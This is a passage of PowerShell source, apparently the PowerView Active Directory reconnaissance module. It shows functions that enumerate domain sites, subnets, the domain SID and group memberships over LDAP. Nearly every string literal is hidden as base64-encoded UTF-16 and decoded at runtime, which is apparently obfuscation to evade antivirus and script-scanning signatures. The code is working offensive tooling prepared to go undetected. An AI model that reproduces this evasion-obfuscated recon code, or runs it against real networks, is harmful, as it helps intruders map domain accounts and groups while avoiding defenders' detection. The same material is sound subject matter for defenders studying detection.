        $SearchBase,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,
        [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
        [String]
        $SecurityMasks,
        [Switch]
        $Tombstone,
        [Alias('ReturnOne')]
        [Switch]
        $FindOne,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty,
        [Switch]
        $Raw
    )
    BEGIN {
        $SearcherArguments = @{
            'SearchBasePrefix' = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBOAD0AUwBpAHQAZQBzACwAQwBOAD0AQwBvAG4AZgBpAGcAdQByAGEAdABpAG8AbgA=')))
        }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) { $SearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $Domain }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AcABlAHIAdABpAGUAcwA=')))]) { $SearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AcABlAHIAdABpAGUAcwA=')))] = $Properties }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))]) { $SearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))] = $SearchBase }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) { $SearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))] = $Server }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))]) { $SearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))] = $SearchScope }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))]) { $SearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))] = $ResultPageSize }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))]) { $SearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))] = $ServerTimeLimit }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGMAdQByAGkAdAB5AE0AYQBzAGsAcwA=')))]) { $SearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGMAdQByAGkAdAB5AE0AYQBzAGsAcwA=')))] = $SecurityMasks }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))]) { $SearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))] = $Tombstone }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { $SearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
        $SiteSearcher = Get-DomainSearcher @SearcherArguments
    }
    PROCESS {
        if ($SiteSearcher) {
            $IdentityFilter = ''
            $Filter = ''
            $Identity | Where-Object {$_} | ForEach-Object {
                $IdentityInstance = $_.Replace('(', $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XAAyADgA')))).Replace(')', $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XAAyADkA'))))
                if ($IdentityInstance -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XgBDAE4APQAuACoA')))) {
                    $IdentityFilter += "(distinguishedname=$IdentityInstance)"
                    if ((-not $PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) -and (-not $PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))])) {
                        $IdentityDomain = $IdentityInstance.SubString($IdentityInstance.IndexOf($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABDAD0A'))))) -replace $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABDAD0A'))),'' -replace ',','.'
                        Write-Verbose "[Get-DomainSite] Extracted domain '$IdentityDomain' from '$IdentityInstance'"
                        $SearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $IdentityDomain
                        $SiteSearcher = Get-DomainSearcher @SearcherArguments
                        if (-not $SiteSearcher) {
                            Write-Warning "[Get-DomainSite] Unable to retrieve domain searcher for '$IdentityDomain'"
                        }
                    }
                }
                else {
                    try {
                        $GuidByteString = (-Join (([Guid]$IdentityInstance).ToByteArray() | ForEach-Object {$_.ToString('X').PadLeft(2,'0')})) -Replace $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KAAuAC4AKQA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XAAkADEA')))
                        $IdentityFilter += "(objectguid=$GuidByteString)"
                    }
                    catch {
                        $IdentityFilter += "(name=$IdentityInstance)"
                    }
                }
            }
            if ($IdentityFilter -and ($IdentityFilter.Trim() -ne '') ) {
                $Filter += "(|$IdentityFilter)"
            }
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBQAEwAaQBuAGsA')))]) {
                Write-Verbose "[Get-DomainSite] Searching for sites with $GPLink set in the gpLink property"
                $Filter += "(gplink=*$GPLink*)"
            }
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABEAEEAUABGAGkAbAB0AGUAcgA=')))]) {
                Write-Verbose "[Get-DomainSite] Using additional LDAP filter: $LDAPFilter"
                $Filter += "$LDAPFilter"
            }
            $SiteSearcher.filter = "(&(objectCategory=site)$Filter)"
            Write-Verbose "[Get-DomainSite] Get-DomainSite filter string: $($SiteSearcher.filter)"
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBpAG4AZABPAG4AZQA=')))]) { $Results = $SiteSearcher.FindAll() }
            else { $Results = $SiteSearcher.FindAll() }
            $Results | Where-Object {$_} | ForEach-Object {
                if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBhAHcA')))]) {
                    $Site = $_
                }
                else {
                    $Site = Convert-LDAPProperty -Properties $_.Properties
                }
                $Site.PSObject.TypeNames.Insert(0, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHcAZQByAFYAaQBlAHcALgBTAGkAdABlAA=='))))
                $Site
            }
            if ($Results) {
                try { $Results.dispose() }
                catch {
                    Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAFMAaQB0AGUAXQAgAEUAcgByAG8AcgAgAGQAaQBzAHAAbwBzAGkAbgBnACAAbwBmACAAdABoAGUAIABSAGUAcwB1AGwAdABzACAAbwBiAGoAZQBjAHQA')))
                }
            }
            $SiteSearcher.dispose()
        }
    }
}
function Get-DomainSubnet {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.Subnet')]
    [CmdletBinding()]
    Param (
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('Name')]
        [String[]]
        $Identity,
        [ValidateNotNullOrEmpty()]
        [String]
        $SiteName,
        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $LDAPFilter,
        [ValidateNotNullOrEmpty()]
        [String[]]
        $Properties,
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $SearchBase,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,
        [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
        [String]
        $SecurityMasks,
        [Switch]
        $Tombstone,
        [Alias('ReturnOne')]
        [Switch]
        $FindOne,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty,
        [Switch]
        $Raw
    )
    BEGIN {
        $SearcherArguments = @{
            'SearchBasePrefix' = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBOAD0AUwB1AGIAbgBlAHQAcwAsAEMATgA9AFMAaQB0AGUAcwAsAEMATgA9AEMAbwBuAGYAaQBnAHUAcgBhAHQAaQBvAG4A')))
        }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) { $SearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $Domain }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AcABlAHIAdABpAGUAcwA=')))]) { $SearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AcABlAHIAdABpAGUAcwA=')))] = $Properties }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))]) { $SearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))] = $SearchBase }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) { $SearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))] = $Server }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))]) { $SearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))] = $SearchScope }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))]) { $SearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))] = $ResultPageSize }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))]) { $SearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))] = $ServerTimeLimit }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGMAdQByAGkAdAB5AE0AYQBzAGsAcwA=')))]) { $SearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGMAdQByAGkAdAB5AE0AYQBzAGsAcwA=')))] = $SecurityMasks }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))]) { $SearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))] = $Tombstone }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { $SearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
        $SubnetSearcher = Get-DomainSearcher @SearcherArguments
    }
    PROCESS {
        if ($SubnetSearcher) {
            $IdentityFilter = ''
            $Filter = ''
            $Identity | Where-Object {$_} | ForEach-Object {
                $IdentityInstance = $_.Replace('(', $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XAAyADgA')))).Replace(')', $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XAAyADkA'))))
                if ($IdentityInstance -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XgBDAE4APQAuACoA')))) {
                    $IdentityFilter += "(distinguishedname=$IdentityInstance)"
                    if ((-not $PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) -and (-not $PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))])) {
                        $IdentityDomain = $IdentityInstance.SubString($IdentityInstance.IndexOf($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABDAD0A'))))) -replace $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABDAD0A'))),'' -replace ',','.'
                        Write-Verbose "[Get-DomainSubnet] Extracted domain '$IdentityDomain' from '$IdentityInstance'"
                        $SearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $IdentityDomain
                        $SubnetSearcher = Get-DomainSearcher @SearcherArguments
                        if (-not $SubnetSearcher) {
                            Write-Warning "[Get-DomainSubnet] Unable to retrieve domain searcher for '$IdentityDomain'"
                        }
                    }
                }
                else {
                    try {
                        $GuidByteString = (-Join (([Guid]$IdentityInstance).ToByteArray() | ForEach-Object {$_.ToString('X').PadLeft(2,'0')})) -Replace $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KAAuAC4AKQA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XAAkADEA')))
                        $IdentityFilter += "(objectguid=$GuidByteString)"
                    }
                    catch {
                        $IdentityFilter += "(name=$IdentityInstance)"
                    }
                }
            }
            if ($IdentityFilter -and ($IdentityFilter.Trim() -ne '') ) {
                $Filter += "(|$IdentityFilter)"
            }
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABEAEEAUABGAGkAbAB0AGUAcgA=')))]) {
                Write-Verbose "[Get-DomainSubnet] Using additional LDAP filter: $LDAPFilter"
                $Filter += "$LDAPFilter"
            }
            $SubnetSearcher.filter = "(&(objectCategory=subnet)$Filter)"
            Write-Verbose "[Get-DomainSubnet] Get-DomainSubnet filter string: $($SubnetSearcher.filter)"
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBpAG4AZABPAG4AZQA=')))]) { $Results = $SubnetSearcher.FindOne() }
            else { $Results = $SubnetSearcher.FindAll() }
            $Results | Where-Object {$_} | ForEach-Object {
                if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBhAHcA')))]) {
                    $Subnet = $_
                }
                else {
                    $Subnet = Convert-LDAPProperty -Properties $_.Properties
                }
                $Subnet.PSObject.TypeNames.Insert(0, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHcAZQByAFYAaQBlAHcALgBTAHUAYgBuAGUAdAA='))))
                if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAHQAZQBOAGEAbQBlAA==')))]) {
                    if ($Subnet.properties -and ($Subnet.properties.siteobject -like "*$SiteName*")) {
                        $Subnet
                    }
                    elseif ($Subnet.siteobject -like "*$SiteName*") {
                        $Subnet
                    }
                }
                else {
                    $Subnet
                }
            }
            if ($Results) {
                try { $Results.dispose() }
                catch {
                    Write-Verbose "[Get-DomainSubnet] Error disposing of the Results object: $_"
                }
            }
            $SubnetSearcher.dispose()
        }
    }
}
function Get-DomainSID {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType([String])]
    [CmdletBinding()]
    Param(
        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )
    $SearcherArguments = @{
        'LDAPFilter' = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KAB1AHMAZQByAEEAYwBjAG8AdQBuAHQAQwBvAG4AdAByAG8AbAA6ADEALgAyAC4AOAA0ADAALgAxADEAMwA1ADUANgAuADEALgA0AC4AOAAwADMAOgA9ADgAMQA5ADIAKQA=')))
    }
    if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) { $SearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $Domain }
    if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) { $SearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))] = $Server }
    if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { $SearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
    $DCSID = Get-DomainComputer @SearcherArguments -FindOne | Select-Object -First 1 -ExpandProperty objectsid
    if ($DCSID) {
        $DCSID.SubString(0, $DCSID.LastIndexOf('-'))
    }
    else {
        Write-Verbose "[Get-DomainSID] Error extracting domain SID for '$Domain'"
    }
}
function Get-DomainGroup {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseDeclaredVarsMoreThanAssignments', '')]
    [OutputType('PowerView.Group')]
    [CmdletBinding(DefaultParameterSetName = 'AllowDelegation')]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name', 'MemberDistinguishedName', 'MemberName')]
        [String[]]
        $Identity,
        [ValidateNotNullOrEmpty()]
        [Alias('UserName')]
        [String]
        $MemberIdentity,
        [Switch]
        $AdminCount,
        [ValidateSet('DomainLocal', 'NotDomainLocal', 'Global', 'NotGlobal', 'Universal', 'NotUniversal')]
        [Alias('Scope')]
        [String]
        $GroupScope,
        [ValidateSet('Security', 'Distribution', 'CreatedBySystem', 'NotCreatedBySystem')]
        [String]
        $GroupProperty,
        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $LDAPFilter,
        [ValidateNotNullOrEmpty()]
        [String[]]
        $Properties,
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $SearchBase,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,
        [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
        [String]
        $SecurityMasks,
        [Switch]
        $Tombstone,
        [Alias('ReturnOne')]
        [Switch]
        $FindOne,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty,
        [Switch]
        $Raw
    )
    BEGIN {
        $SearcherArguments = @{}
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) { $SearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $Domain }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AcABlAHIAdABpAGUAcwA=')))]) { $SearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AcABlAHIAdABpAGUAcwA=')))] = $Properties }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))]) { $SearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))] = $SearchBase }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) { $SearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))] = $Server }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))]) { $SearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))] = $SearchScope }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))]) { $SearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))] = $ResultPageSize }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))]) { $SearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))] = $ServerTimeLimit }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGMAdQByAGkAdAB5AE0AYQBzAGsAcwA=')))]) { $SearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGMAdQByAGkAdAB5AE0AYQBzAGsAcwA=')))] = $SecurityMasks }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))]) { $SearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))] = $Tombstone }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { $SearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
        $GroupSearcher = Get-DomainSearcher @SearcherArguments
    }
    PROCESS {
        if ($GroupSearcher) {
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBlAG0AYgBlAHIASQBkAGUAbgB0AGkAdAB5AA==')))]) {
                if ($SearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AcABlAHIAdABpAGUAcwA=')))]) {
                    $OldProperties = $SearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AcABlAHIAdABpAGUAcwA=')))]
                }
                $SearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBkAGUAbgB0AGkAdAB5AA==')))] = $MemberIdentity
                $SearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBhAHcA')))] = $True
                Get-DomainObject @SearcherArguments | ForEach-Object {
                    $ObjectDirectoryEntry = $_.GetDirectoryEntry()
                    $ObjectDirectoryEntry.RefreshCache($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('dABvAGsAZQBuAEcAcgBvAHUAcABzAA=='))))
                    $ObjectDirectoryEntry.TokenGroups | ForEach-Object {
                        $GroupSid = (New-Object System.Security.Principal.SecurityIdentifier($_,0)).Value
                        if ($GroupSid -notmatch $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XgBTAC0AMQAtADUALQAzADIALQAuACoA')))) {
                            $SearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBkAGUAbgB0AGkAdAB5AA==')))] = $GroupSid
                            $SearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBhAHcA')))] = $False
                            if ($OldProperties) { $SearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AcABlAHIAdABpAGUAcwA=')))] = $OldProperties }
                            $Group = Get-DomainObject @SearcherArguments
                            if ($Group) {
                                $Group.PSObject.TypeNames.Insert(0, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHcAZQByAFYAaQBlAHcALgBHAHIAbwB1AHAA'))))
                                $Group
                            }
                        }
                    }
                }
            }
            else {
                $IdentityFilter = ''
                $Filter = ''
                $Identity | Where-Object {$_} | ForEach-Object {
                    $IdentityInstance = $_.Replace('(', $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XAAyADgA')))).Replace(')', $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XAAyADkA'))))
                    if ($IdentityInstance -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XgBTAC0AMQAtAA==')))) {
                        $IdentityFilter += "(objectsid=$IdentityInstance)"
                    }
                    elseif ($IdentityInstance -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XgBDAE4APQA=')))) {
                        $IdentityFilter += "(distinguishedname=$IdentityInstance)"
                        if ((-not $PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) -and (-not $PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))])) {
                            $IdentityDomain = $IdentityInstance.SubString($IdentityInstance.IndexOf($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABDAD0A'))))) -replace $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABDAD0A'))),'' -replace ',','.'
                            Write-Verbose "[Get-DomainGroup] Extracted domain '$IdentityDomain' from '$IdentityInstance'"
                            $SearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $IdentityDomain
                            $GroupSearcher = Get-DomainSearcher @SearcherArguments
                            if (-not $GroupSearcher) {
                                Write-Warning "[Get-DomainGroup] Unable to retrieve domain searcher for '$IdentityDomain'"
                            }
                        }
                    }
                    elseif ($IdentityInstance -imatch $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XgBbADAALQA5AEEALQBGAF0AewA4AH0ALQAoAFsAMAAtADkAQQAtAEYAXQB7ADQAfQAtACkAewAzAH0AWwAwAC0AOQBBAC0ARgBdAHsAMQAyAH0AJAA=')))) {
                        $GuidByteString = (([Guid]$IdentityInstance).ToByteArray() | ForEach-Object { '\' + $_.ToString('X2') }) -join ''
                        $IdentityFilter += "(objectguid=$GuidByteString)"
                    }
                    elseif ($IdentityInstance.Contains('\')) {
                        $ConvertedIdentityInstance = $IdentityInstance.Replace($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XAAyADgA'))), '(').Replace($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XAAyADkA'))), ')') | Convert-ADName -OutputType Canonical
                        if ($ConvertedIdentityInstance) {
                            $GroupDomain = $ConvertedIdentityInstance.SubString(0, $ConvertedIdentityInstance.IndexOf('/'))
                            $GroupName = $IdentityInstance.Split('\')[1]
                            $IdentityFilter += "(samAccountName=$GroupName)"
                            $SearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $GroupDomain
                            Write-Verbose "[Get-DomainGroup] Extracted domain '$GroupDomain' from '$IdentityInstance'"
                            $GroupSearcher = Get-DomainSearcher @SearcherArguments
                        }
                    }
                    else {
                        $IdentityFilter += "(|(samAccountName=$IdentityInstance)(name=$IdentityInstance))"
                    }
                }
                if ($IdentityFilter -and ($IdentityFilter.Trim() -ne '') ) {
                    $Filter += "(|$IdentityFilter)"
                }
                if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBkAG0AaQBuAEMAbwB1AG4AdAA=')))]) {
